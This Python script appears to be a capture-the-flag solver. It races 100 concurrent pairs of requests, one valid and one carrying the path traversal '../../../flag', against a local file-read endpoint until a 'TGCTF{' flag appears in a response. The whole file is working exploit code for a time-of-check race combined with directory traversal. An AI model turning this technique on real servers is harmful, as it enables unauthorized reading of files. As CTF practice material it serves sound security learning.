import aiohttp
import asyncio
import time

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.READ_FILE_ENDPOINT = f'{self.baseUrl}'
        self.VALID_CHECK_PARAMETER = '/read?name=1'
        self.INVALID_CHECK_PARAMETER = '/read?name=../../../flag'
        self.RACE_CONDITION_JOBS = 100

    async def raceValidationCheck(self, session, parameter):
        url = f'{self.READ_FILE_ENDPOINT}{parameter}'
        async with session.get(url) as response:
            return await response.text()

    async def raceCondition(self, session):
        tasks = []
        for _ in range(self.RACE_CONDITION_JOBS):
            tasks.append(self.raceValidationCheck(session, self.VALID_CHECK_PARAMETER))
            tasks.append(self.raceValidationCheck(session, self.INVALID_CHECK_PARAMETER))
        return await asyncio.gather(*tasks)

    async def solve(self):
        async with aiohttp.ClientSession() as session:
            attempts = 1
            finishedRaceConditionJobs = 0
            while True:
                print(f'[*] Attempt {attempts} - Finished race condition jobs: {finishedRaceConditionJobs}')
                results = await self.raceCondition(session)
                attempts += 1
                finishedRaceConditionJobs += self.RACE_CONDITION_JOBS * 2
                for result in results:
                    if 'TGCTF{' in result:
                        print(f'\n[+] We won the race window! Flag:\n{result.strip()}')
                        exit(0)

if __name__ == '__main__':
    baseUrl = 'http://127.0.0.1:2197'
    solver = Solver(baseUrl)
    asyncio.run(solver.solve())
